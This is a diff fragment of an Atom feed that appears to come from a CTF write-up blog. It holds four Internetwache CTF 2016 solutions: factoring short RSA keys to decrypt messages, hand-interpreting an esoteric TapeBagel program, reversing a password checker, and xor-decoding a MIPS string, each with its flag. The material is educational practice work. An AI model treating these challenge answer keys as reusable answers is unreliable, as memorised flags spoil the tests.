+      <category term="writeup" scheme="http://poning.me/categories/writeup/"/>
+    
+    
+      <category term="crypto" scheme="http://poning.me/tags/crypto/"/>
+    
+      <category term="Internetwache CTF" scheme="http://poning.me/tags/Internetwache-CTF/"/>
+    
+      <category term="xor" scheme="http://poning.me/tags/xor/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Internetwache CTF 2016: Oh Bob! (crypto 60)</title>
+    <link href="http://poning.me/2016/03/01/oh-bob/"/>
+    <id>http://poning.me/2016/03/01/oh-bob/</id>
+    <published>2016-03-01T01:08:18.000Z</published>
+    <updated>2016-08-04T02:56:07.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>Alice wants to send Bob a confidential message. They both remember the crypto lecture about RSA. So Bob uses openssl to create key pairs. Finally, Alice encrypts the message with Bob’s public keys and sends it to Bob. Clever Eve was able to intercept it. Can you help Eve to decrypt the message?<br><strong>Attachment:</strong> <a href="/2016/03/01/oh-bob/crypto60.zip" title="crypto60.zip">crypto60.zip</a></p>
+</blockquote>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>The RSA keys are too short. They are only 228 bits that can be easily fatorized by <a href="https://sourceforge.net/projects/yafu/" target="_blank" rel="external">yafu</a>. After fatorization, we can decrypt the messages use the RSA algorithm.</p>
+<figure class="highlight python"><figcaption><span>publickey.py</span><a href="/2016/03/01/oh-bob/publickey.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br></pre></td><td class="code"><pre><span class="hljs-keyword">import</span> rsa<br><br><span class="hljs-keyword">with</span> open(<span class="hljs-string">'bob.pub'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:<br>    pub1 = f.read()<br><br><span class="hljs-keyword">with</span> open(<span class="hljs-string">'bob2.pub'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:<br>    pub2 = f.read()<br><br><span class="hljs-keyword">with</span> open(<span class="hljs-string">'bob3.pub'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:<br>    pub3 = f.read()<br><br><span class="hljs-keyword">print</span> rsa.PublicKey.load_pkcs1_openssl_pem(pub1)<br><span class="hljs-keyword">print</span> rsa.PublicKey.load_pkcs1_openssl_pem(pub2)<br><span class="hljs-keyword">print</span> rsa.PublicKey.load_pkcs1_openssl_pem(pub3)<br></pre></td></tr></table></figure>
+<figure class="highlight python"><figcaption><span>decrypt.py</span><a href="/2016/03/01/oh-bob/decrypt.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">import</span> rsa<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extended_gcd</span><span class="hljs-params">(aa, bb)</span>:</span><br>    lastremainder, remainder = abs(aa), abs(bb)<br>    x, lastx, y, lasty = <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> remainder:<br>        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)<br>        x, lastx = lastx - quotient*x, x<br>        y, lasty = lasty - quotient*y, y<br>    <span class="hljs-keyword">return</span> lastremainder, lastx * (<span class="hljs-number">-1</span> <span class="hljs-keyword">if</span> aa &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">1</span>), lasty * (<span class="hljs-number">-1</span> <span class="hljs-keyword">if</span> bb &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">1</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modinv</span><span class="hljs-params">(a, m)</span>:</span><br>    g, x, y = extended_gcd(a, m)<br>    <span class="hljs-keyword">if</span> g != <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">raise</span> ValueError<br>    <span class="hljs-keyword">return</span> x % m<br><br>n = <span class="hljs-number">359567260516027240236814314071842368703501656647819140843316303878351</span><br>p = <span class="hljs-number">17963604736595708916714953362445519</span><br>q = <span class="hljs-number">20016431322579245244930631426505729</span><br>e = <span class="hljs-number">65537</span><br>d = modinv(e, (p<span class="hljs-number">-1</span>)*(q<span class="hljs-number">-1</span>))<br>pk = rsa.PrivateKey(n, e, d, p, q)<br><span class="hljs-keyword">print</span> rsa.decrypt(b64decode(<span class="hljs-string">'DK9dt2MTybMqRz/N2RUMq2qauvqFIOnQ89mLjXY='</span>), pk)<br><br>n = <span class="hljs-number">273308045849724059815624389388987562744527435578575831038939266472921</span><br>p = <span class="hljs-number">16549930833331357120312254608496323</span><br>q = <span class="hljs-number">16514150337068782027309734859141427</span><br>e = <span class="hljs-number">65537</span><br>d = modinv(e, (p<span class="hljs-number">-1</span>)*(q<span class="hljs-number">-1</span>))<br>pk = rsa.PrivateKey(n, e, d, p, q)<br><span class="hljs-keyword">print</span> rsa.decrypt(b64decode(<span class="hljs-string">'CiLSeTUCCKkyNf8NVnifGKKS2FJ7VnWKnEdygXY='</span>), pk)<br><br>n = <span class="hljs-number">333146335555060589623326457744716213139646991731493272747695074955549</span><br>p = <span class="hljs-number">19193025210159847056853811703017693</span><br>q = <span class="hljs-number">17357677172158834256725194757225793</span><br>e = <span class="hljs-number">65537</span><br>d = modinv(e, (p<span class="hljs-number">-1</span>)*(q<span class="hljs-number">-1</span>))<br>pk = rsa.PrivateKey(n, e, d, p, q)<br><span class="hljs-keyword">print</span> rsa.decrypt(b64decode(<span class="hljs-string">'AK/WPYsK5ECFsupuW98bCFKYUApgrQ6LTcm3KxY='</span>), pk)<br></pre></td></tr></table></figure>
+<blockquote>
+<p>Flag: <code>IW{WEAK_RSA_K3YS_4R3_SO_BAD!}</code></p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;Alice wants to send B
+    
+    </summary>
+    
+      <category term="writeup" scheme="http://poning.me/categories/writeup/"/>
+    
+    
+      <category term="crypto" scheme="http://poning.me/tags/crypto/"/>
+    
+      <category term="Internetwache CTF" scheme="http://poning.me/tags/Internetwache-CTF/"/>
+    
+      <category term="RSA" scheme="http://poning.me/tags/RSA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Internetwache CTF 2016: Eso Tape (rev 80)</title>
+    <link href="http://poning.me/2016/02/29/eso-tape/"/>
+    <id>http://poning.me/2016/02/29/eso-tape/</id>
+    <published>2016-02-29T06:50:05.000Z</published>
+    <updated>2016-08-04T02:56:07.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>Description: I once took a nap on my keyboard. I dreamed of a brand new language, but I could not decipher it nor get its meaning. Can you help me?<br><strong>Hint:</strong> Replace the spaces with either ‘{‘ or ‘}’ in the solution.<br><strong>Hint:</strong> Interpreters don’t help. Operations write to the current index.<br><strong>Attachment:</strong> <a href="/2016/02/29/eso-tape/rev80.zip" title="rev80.zip">rev80.zip</a></p>
+</blockquote>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight plain"><figcaption><span>priner.tb</span></figcaption><table><tr><td class="code"><pre>## %% %++ %++ %++ %# *&amp;* @** %# **&amp;* ***-* ***-* %++ %++ @*** *-* @*** @** *+** @*** ***+* @*** **+** ***+* %++ @*** #% %% %++ %++ %++ %++ @* %# %++ %++ %++ %% *&amp;** @* @*** *-** @* %# %++ @** *-** *-** **-*** **-*** **-*** @** @*** #% %% %++ %++ %++ %++ %# *+** %++ @** @* %# *+** @*** ## %% @*** <br></pre></td></tr></table></figure>
+<p>From the word “eso” in title and the unfriendly language showing above, we could guess this challenge is about esoteric language. Then, the hardest part of the challenge is to figure out what the fuck this language is. I luckily found out that the answer is <a href="https://esolangs.org/wiki/TapeBagel" target="_blank" rel="external">TapeBagel</a> by searching “tape” in <a href="https://esolangs.org/wiki/Language_list" target="_blank" rel="external">this</a> esoteric language list. This also explains why the file extension is “.tb”.</p>
+<p>Now all we need is to spend a few minutes understanding the language and either program an interpreter or use human interpreter. I chose the latter and recorded the process as below.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre>inst: ##     inst: %%     inst: %++    inst: %++    inst: %++<br>int: [0] 0 0 int: [0] 0 0 int: [1] 0 0 int: [2] 0 0 int: [3] 0 0<br>output:      output:      output:      output:      output:     <br><br>inst: %#     inst: *&amp;*    inst: @**    inst: %#     inst: **&amp;*<br>int: 3 [0] 0 int: 3 [9] 0 int: 3 [9] 0 int: 3 9 [0] int: 3 9 [27]<br>output:      output:      output: I    output: I    output: I   <br><br>inst: ***-*   inst: ***-*   inst: %++     inst: %++<br>int: 3 9 [24] int: 3 9 [21] int: 3 9 [22] int: 3 9 [23]<br>output: I     output: I     output: I     output: I   <br><br>inst: @***    inst: *-*    inst: @***   inst: @**<br>int: 3 9 [23] int: 3 9 [0] int: 3 9 [0] int: 3 9 [0]<br>output: IW    output: IW   output: IW_  output: IW_I  <br><br>inst: *+**    inst: @***    inst: ***+*    inst: @***<br>int: 3 9 [12] int: 3 9 [12] int: 3 9 [15] int: 3 9 [15]<br>output: IW_I  output: IW_IL output: IW_IL output: IW_ILO  <br><br>inst: **+**    inst: ***+*    inst: %++     inst: @***<br>int: 3 9 [18]  int: 3 9 [21]  int: 3 9 [22] int: 3 9 [22]<br>output: IW_ILO output: IW_ILO output: IW_IL output: IW_ILOV <br><br>inst: #%        inst: %%        inst: %++       inst: %++<br>int: 1 1 [1]    int: [1] 1 1    int: [2] 1 1    int: [3] 1 1<br>output: IW_ILOV output: IW_ILOV output: IW_ILOV output: IW_ILOV <br><br>inst: %++       inst: %++       inst: @*         inst: %#<br>int: [4] 1 1    int: [5] 1 1    int: [5] 1 1     int: 5 [1] 1<br>output: IW_ILOV output: IW_ILOV output: IW_ILOVE output: IW_ILOVE<br><br>inst: %++        inst: %++        inst: %++        inst: %%<br>int: 5 [2] 1     int: 5 [3] 1     int: 5 [4] 1     int: [5] 4 1<br>output: IW_ILOVE output: IW_ILOVE output: IW_ILOVE output: IW_ILOVE<br><br>inst: *&amp;**       inst: @*          inst: @***         inst: *-**<br>int: [20] 4 1    int: [20] 4 1     int: [20] 4 1      int: [16] 4 1<br>output: IW_ILOVE output: IW_ILOVET output: IW_ILOVETA output: IW_ILOVETA<br><br>inst: @*            inst: %#            inst: %++<br>int: [16] 4 1       int: 16 [4] 1       int: 16 [5] 1<br>output: IW_ILOVETAP output: IW_ILOVETAP output: IW_ILOVETAP<br><br>inst: @**            inst: *-**           inst: *-**<br>int: 16 [5] 1        int: 16 [11] 1       int: 16 [5] 1<br>output: IW_ILOVETAPE output: IW_ILOVETAPE output: IW_ILOVETAPE<br><br>inst: **-***         inst: **-***         inst: **-***<br>int: 16 [4] 1        int: 16 [3] 1        int: 16 [2] 1<br>output: IW_ILOVETAPE output: IW_ILOVETAPE output: IW_ILOVETAPE<br><br>inst: @**             inst: @***             inst: #%<br>int: 16 [2] 1         int: 16 [2] 1          int: 1 [1] 1<br>output: IW_ILOVETAPEB output: IW_ILOVETAPEBA output: IW_ILOVETAPEBA<br><br>inst: %%               inst: %++              inst: %++<br>int: [1] 1 1           int: [2] 1 1           int: [3] 1 1<br>output: IW_ILOVETAPEBA output: IW_ILOVETAPEBA output: IW_ILOVETAPEBA<br><br>inst: %++              inst: %++              inst: %#<br>int: [4] 1 1           int: [5] 1 1           int: 5 [1] 1<br>output: IW_ILOVETAPEBA output: IW_ILOVETAPEBA output: IW_ILOVETAPEBA<br><br>inst: *+**             inst: %++              inst: @**<br>int: 5 [6] 1           int: 5 [7] 1           int: 5 [7] 1<br>output: IW_ILOVETAPEBA output: IW_ILOVETAPEBA output: IW_ILOVETAPEBAG<br><br>inst: @*                 inst: %#<br>int: 5 [7] 1             int: 5 7 [1]<br>output: IW_ILOVETAPEBAGE output: IW_ILOVETAPEBAGE<br><br>inst: *+**               inst: @***<br>int: 5 7 [12]            int: 5 7 [12]<br>output: IW_ILOVETAPEBAGE output: IW_ILOVETAPEBAGEL<br><br>inst: ##                  inst: %%<br>int: 0 0 [0]              int: [0] 0 0<br>output: IW_ILOVETAPEBAGEL output: IW_ILOVETAPEBAGEL<br><br>inst: @***<br>int: [0] 0 0<br>output: IW_ILOVETAPEBAGEL_<br></pre></td></tr></table></figure>
+<p>The flag can be easily guessed during the halfway of interpretation.</p>
+<blockquote>
+<p>Flag: <code>IW{ILOVETAPEBAGEL}</code></p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;Description: I once t
+    
+    </summary>
+    
+      <category term="writeup" scheme="http://poning.me/categories/writeup/"/>
+    
+    
+      <category term="Internetwache CTF" scheme="http://poning.me/tags/Internetwache-CTF/"/>
+    
+      <category term="reversing" scheme="http://poning.me/tags/reversing/"/>
+    
+      <category term="esoteric" scheme="http://poning.me/tags/esoteric/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Internetwache CTF 2016: File Checker (rev 60)</title>
+    <link href="http://poning.me/2016/02/26/file-checker/"/>
+    <id>http://poning.me/2016/02/26/file-checker/</id>
+    <published>2016-02-26T05:36:13.000Z</published>
+    <updated>2016-08-04T02:56:07.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>My friend sent me this file. He told that if I manage to reverse it, I’ll have access to all his devices. My misfortune that I don’t know anything about reversing :/<br><strong>Attachment:</strong> <a href="/2016/02/26/file-checker/rev60.zip" title="rev60.zip">rev60.zip</a></p>
+</blockquote>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight c"><figcaption><span>filechecker</span></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br></pre></td><td class="code"><pre>stream = fopen(<span class="hljs-string">".password"</span>, <span class="hljs-string">"r"</span>);<br><span class="hljs-keyword">if</span> ( stream )<br>&#123;<br>  v4 = <span class="hljs-number">15</span>;<br>  value = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v4; ++i )<br>  &#123;<br>    chr = fgetc(stream);<br>    <span class="hljs-keyword">if</span> ( feof(stream) )<br>    &#123;<br>      value |= <span class="hljs-number">0x1337</span>u;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>    sub_40079C(i, &amp;chr);<br>    value |= chr;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( value &lt;= <span class="hljs-number">0</span> )<br>  &#123;<br>    fclose(stream);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Congrats!"</span>);<br>    result = <span class="hljs-number">0L</span>L;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Error: Wrong characters"</span>);<br>    result = <span class="hljs-number">1L</span>L;<br>  &#125;<br>&#125;<br></pre></td></tr></table></figure>
+<figure class="highlight c"><figcaption><span>sub_40079C</span></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br></pre></td><td class="code"><pre>v4 = <span class="hljs-number">4846</span>;<br>v5 = <span class="hljs-number">4832</span>;<br>v6 = <span class="hljs-number">4796</span>;<br>v7 = <span class="hljs-number">4849</span>;<br>v8 = <span class="hljs-number">4846</span>;<br>v9 = <span class="hljs-number">4843</span>;<br>v10 = <span class="hljs-number">4850</span>;<br>v11 = <span class="hljs-number">4824</span>;<br>v12 = <span class="hljs-number">4852</span>;<br>v13 = <span class="hljs-number">4847</span>;<br>v14 = <span class="hljs-number">4818</span>;<br>v15 = <span class="hljs-number">4852</span>;<br>v16 = <span class="hljs-number">4844</span>;<br>v17 = <span class="hljs-number">4822</span>;<br>v18 = <span class="hljs-number">4794</span>;<br>v2 = (*(&amp;v4 + i) + *chr) % <span class="hljs-number">4919</span>;<br>result = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v2;<br>*chr = v2;<br></pre></td></tr></table></figure>
+<p>After decompiled by IDA pro, what the program does is really clear. It reads a string of 15 characters from file <code>.password</code> and check whether the following condition is satisfied.</p>
+<figure class="highlight c"><table><tr><td class="code"><pre>(str[<span class="hljs-number">0</span>] + V[<span class="hljs-number">0</span>])%<span class="hljs-number">4919</span> | ... | (str[<span class="hljs-number">14</span>] + V[<span class="hljs-number">14</span>])%<span class="hljs-number">4919</span> &lt;= <span class="hljs-number">0</span>,<br>where V = [<span class="hljs-number">4846</span>, <span class="hljs-number">4832</span>, <span class="hljs-number">4796</span>, <span class="hljs-number">4849</span>, <span class="hljs-number">4846</span>, <span class="hljs-number">4843</span>, <span class="hljs-number">4850</span>, <br>                <span class="hljs-number">4824</span>, <span class="hljs-number">4852</span>, <span class="hljs-number">4847</span>, <span class="hljs-number">4818</span>, <span class="hljs-number">4852</span>, <span class="hljs-number">4844</span>, <span class="hljs-number">4822</span>, <span class="hljs-number">4794</span>]<br></pre></td></tr></table></figure>
+<p>To satisfied the condition, just make every <code>(str[i] + V[i]) = 4919</code>. By the way, during the competition, when I saw the numbers <code>48xx</code> and <code>4919</code>, I was able to guess that the flag is the difference between two numbers. I have written a script to compute the flag.</p>
+<figure class="highlight python"><figcaption><span>decode.py</span><a href="/2016/02/26/file-checker/decode.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br></pre></td><td class="code"><pre>ary = [<span class="hljs-number">4846</span>, <span class="hljs-number">4832</span>, <span class="hljs-number">4796</span>, <span class="hljs-number">4849</span>, <span class="hljs-number">4846</span>, <span class="hljs-number">4843</span>, <span class="hljs-number">4850</span>, <span class="hljs-number">4824</span>, <span class="hljs-number">4852</span>, <span class="hljs-number">4847</span>, <span class="hljs-number">4818</span>, <span class="hljs-number">4852</span>, <span class="hljs-number">4844</span>, <span class="hljs-number">4822</span>, <span class="hljs-number">4794</span>]<br><span class="hljs-keyword">print</span> <span class="hljs-string">''</span>.join([chr(<span class="hljs-number">4919</span> - x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ary])<br></pre></td></tr></table></figure>
+<blockquote>
+<p>Flag: <code>IW{FILE_CHeCKa}</code></p>
+</blockquote>
+<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><p><strong>Learned:</strong> How GCC optimize division and modulo operation. <a href="http://reverseengineering.stackexchange.com/questions/1397/how-can-i-reverse-optimized-integer-division-modulo-by-constant-operations" target="_blank" rel="external">Reference</a>. Maybe I will read <a href="http://www.hackersdelight.org/" target="_blank" rel="external">Hacker’s Delight</a> someday.</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;My friend sent me thi
+    
+    </summary>
+    
+      <category term="writeup" scheme="http://poning.me/categories/writeup/"/>
+    
+    
+      <category term="Internetwache CTF" scheme="http://poning.me/tags/Internetwache-CTF/"/>
+    
+      <category term="reversing" scheme="http://poning.me/tags/reversing/"/>
+    
+      <category term="x86-64" scheme="http://poning.me/tags/x86-64/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Internetwache CTF 2016: SPIM (rev 50)</title>
+    <link href="http://poning.me/2016/02/25/spim/"/>
+    <id>http://poning.me/2016/02/25/spim/</id>
+    <published>2016-02-25T13:20:00.000Z</published>
+    <updated>2016-08-04T02:56:07.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>My friend keeps telling me, that real hackers speak assembly fluently. Are you a real hacker? Decode this string: “IVyN5U3X)ZUMYCs”<br><strong>Attachment:</strong> <a href="/2016/02/25/spim/rev50.zip" title="rev50.zip">rev50.zip</a></p>
+</blockquote>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight mips"><figcaption><span>README.txt</span></figcaption><table><tr><td class="code"><pre>User Text Segment [<span class="hljs-number">00400000</span>]..[<span class="hljs-number">00440000</span>]<br>[<span class="hljs-number">00400000</span>] <span class="hljs-number">8</span>fa40000  <span class="hljs-keyword">lw </span>$<span class="hljs-number">4</span>, <span class="hljs-number">0</span>($<span class="hljs-number">29</span>)            <span class="hljs-comment">; 183: lw $a0 0($sp) # argc </span><br>[<span class="hljs-number">00400004</span>] <span class="hljs-number">27</span>a50004  <span class="hljs-keyword">addiu </span>$<span class="hljs-number">5</span>, $<span class="hljs-number">29</span>, <span class="hljs-number">4</span>         <span class="hljs-comment">; 184: addiu $a1 $sp 4 # argv </span><br>[<span class="hljs-number">00400008</span>] <span class="hljs-number">24</span>a60004  <span class="hljs-keyword">addiu </span>$<span class="hljs-number">6</span>, $<span class="hljs-number">5</span>, <span class="hljs-number">4</span>          <span class="hljs-comment">; 185: addiu $a2 $a1 4 # envp </span><br>[<span class="hljs-number">0040000</span>c] <span class="hljs-number">00041080</span>  <span class="hljs-keyword">sll </span>$<span class="hljs-number">2</span>, $<span class="hljs-number">4</span>, <span class="hljs-number">2</span>            <span class="hljs-comment">; 186: sll $v0 $a0 2 </span><br>[<span class="hljs-number">00400010</span>] <span class="hljs-number">00</span>c23021  <span class="hljs-keyword">addu </span>$<span class="hljs-number">6</span>, $<span class="hljs-number">6</span>, $<span class="hljs-number">2</span>          <span class="hljs-comment">; 187: addu $a2 $a2 $v0 </span><br>[<span class="hljs-number">00400014</span>] <span class="hljs-number">0</span>c100009  <span class="hljs-keyword">jal </span><span class="hljs-number">0x00400024</span> [main]    <span class="hljs-comment">; 188: jal main </span><br>[<span class="hljs-number">00400018</span>] <span class="hljs-number">00000000</span>  <span class="hljs-keyword">nop </span>                     <span class="hljs-comment">; 189: nop </span><br>[<span class="hljs-number">0040001</span>c] <span class="hljs-number">3402000</span>a  <span class="hljs-keyword">ori </span>$<span class="hljs-number">2</span>, $<span class="hljs-number">0</span>, <span class="hljs-number">10</span>           <span class="hljs-comment">; 191: li $v0 10 </span><br>[<span class="hljs-number">00400020</span>] <span class="hljs-number">0000000</span>c  <span class="hljs-keyword">syscall </span>                 <span class="hljs-comment">; 192: syscall # syscall 10 (exit) </span><br>[<span class="hljs-number">00400024</span>] <span class="hljs-number">3</span>c081001  <span class="hljs-keyword">lui </span>$<span class="hljs-number">8</span>, <span class="hljs-number">4097</span> [flag]      <span class="hljs-comment">; 7: la $t0, flag </span><br>[<span class="hljs-number">00400028</span>] <span class="hljs-number">00004821</span>  <span class="hljs-keyword">addu </span>$<span class="hljs-number">9</span>, $<span class="hljs-number">0</span>, $<span class="hljs-number">0</span>          <span class="hljs-comment">; 8: move $t1, $0 </span><br>[<span class="hljs-number">0040002</span>c] <span class="hljs-number">3401000</span>f  <span class="hljs-keyword">ori </span>$<span class="hljs-number">1</span>, $<span class="hljs-number">0</span>, <span class="hljs-number">15</span>           <span class="hljs-comment">; 11: sgt $t2, $t1, 15 </span><br>[<span class="hljs-number">00400030</span>] <span class="hljs-number">0029502</span>a  <span class="hljs-keyword">slt </span>$<span class="hljs-number">10</span>, $<span class="hljs-number">1</span>, $<span class="hljs-number">9</span>          <br>[<span class="hljs-number">00400034</span>] <span class="hljs-number">34010001</span>  <span class="hljs-keyword">ori </span>$<span class="hljs-number">1</span>, $<span class="hljs-number">0</span>, <span class="hljs-number">1</span>            <span class="hljs-comment">; 12: beq $t2, 1, exit </span><br>[<span class="hljs-number">00400038</span>] <span class="hljs-number">102</span>a0007  <span class="hljs-keyword">beq </span>$<span class="hljs-number">1</span>, $<span class="hljs-number">10</span>, <span class="hljs-number">28</span> [exit-0x00400038] <br>[<span class="hljs-number">0040003</span>c] <span class="hljs-number">01095020</span>  <span class="hljs-keyword">add </span>$<span class="hljs-number">10</span>, $<span class="hljs-number">8</span>, $<span class="hljs-number">9</span>          <span class="hljs-comment">; 14: add $t2, $t0, $t1 </span><br>[<span class="hljs-number">00400040</span>] <span class="hljs-number">81440000</span>  <span class="hljs-keyword">lb </span>$<span class="hljs-number">4</span>, <span class="hljs-number">0</span>($<span class="hljs-number">10</span>)            <span class="hljs-comment">; 15: lb $a0, ($t2) </span><br>[<span class="hljs-number">00400044</span>] <span class="hljs-number">00892026</span>  <span class="hljs-keyword">xor </span>$<span class="hljs-number">4</span>, $<span class="hljs-number">4</span>, $<span class="hljs-number">9</span>           <span class="hljs-comment">; 16: xor $a0, $a0, $t1 </span><br>[<span class="hljs-number">00400048</span>] a1440000  <span class="hljs-keyword">sb </span>$<span class="hljs-number">4</span>, <span class="hljs-number">0</span>($<span class="hljs-number">10</span>)            <span class="hljs-comment">; 17: sb $a0, 0($t2) </span><br>[<span class="hljs-number">0040004</span>c] <span class="hljs-number">21290001</span>  <span class="hljs-keyword">addi </span>$<span class="hljs-number">9</span>, $<span class="hljs-number">9</span>, <span class="hljs-number">1</span>           <span class="hljs-comment">; 19: add $t1, $t1, 1 </span><br>[<span class="hljs-number">00400050</span>] <span class="hljs-number">0810000</span>b  <span class="hljs-keyword">j </span><span class="hljs-number">0x0040002c</span> [for]       <span class="hljs-comment">; 20: j for </span><br>[<span class="hljs-number">00400054</span>] <span class="hljs-number">00082021</span>  <span class="hljs-keyword">addu </span>$<span class="hljs-number">4</span>, $<span class="hljs-number">0</span>, $<span class="hljs-number">8</span>          <span class="hljs-comment">; 24: move $a0, $t0 </span><br>[<span class="hljs-number">00400058</span>] <span class="hljs-number">0</span>c100019  <span class="hljs-keyword">jal </span><span class="hljs-number">0x00400064</span> [printstring]<span class="hljs-comment">; 25: jal printstring </span><br>[<span class="hljs-number">0040005</span>c] <span class="hljs-number">3402000</span>a  <span class="hljs-keyword">ori </span>$<span class="hljs-number">2</span>, $<span class="hljs-number">0</span>, <span class="hljs-number">10</span>           <span class="hljs-comment">; 26: li $v0, 10 </span><br>[<span class="hljs-number">00400060</span>] <span class="hljs-number">0000000</span>c  <span class="hljs-keyword">syscall </span>                 <span class="hljs-comment">; 27: syscall </span><br>[<span class="hljs-number">00400064</span>] <span class="hljs-number">34020004</span>  <span class="hljs-keyword">ori </span>$<span class="hljs-number">2</span>, $<span class="hljs-number">0</span>, <span class="hljs-number">4</span>            <span class="hljs-comment">; 30: li $v0, 4 </span><br>[<span class="hljs-number">00400068</span>] <span class="hljs-number">0000000</span>c  <span class="hljs-keyword">syscall </span>                 <span class="hljs-comment">; 31: syscall </span><br>[<span class="hljs-number">0040006</span>c] <span class="hljs-number">03</span>e00008  <span class="hljs-keyword">jr </span>$<span class="hljs-number">31</span>                   <span class="hljs-comment">; 32: jr $ra </span><br></pre></td></tr></table></figure>
+<p>As the title suggests, this is a MIPS assembly file (SPIM is a MIPS simulator). The key instruction is <code>xor $a0, $a0, $t1</code>. This program uses a loop to xor every charactor with the counter. We can decode it as follw.</p>
+<figure class="highlight python"><figcaption><span>decode.py</span><a href="/2016/02/25/spim/decode.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br></pre></td><td class="code"><pre>enc = <span class="hljs-string">'IVyN5U3X)ZUMYCs'</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">''</span>.join([chr(ord(c)^i) <span class="hljs-keyword">for</span> i, c <span class="hljs-keyword">in</span> enumerate(enc)])<br></pre></td></tr></table></figure>
+<p>To solve this question, you either learn the basic of MIPS, or you can try xoring the first three charactors of encoded string <code>IVy</code> with the known beginning of th flag <code>IW{</code>. You will find out that the output is <code>0 1 2</code> and can guess the whole algorithm.</p>
+<blockquote>
+<p>Flag: <code>IW{M1P5_!S_FUN}</code></p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;My friend keeps telli
+    
+    </summary>
+    
+      <category term="writeup" scheme="http://poning.me/categories/writeup/"/>
+    
+    
+      <category term="Internetwache CTF" scheme="http://poning.me/tags/Internetwache-CTF/"/>
+    
+      <category term="reversing" scheme="http://poning.me/tags/reversing/"/>
+    
+      <category term="MIPS" scheme="http://poning.me/tags/MIPS/"/>
+    
+  </entry>
+  
+</feed>
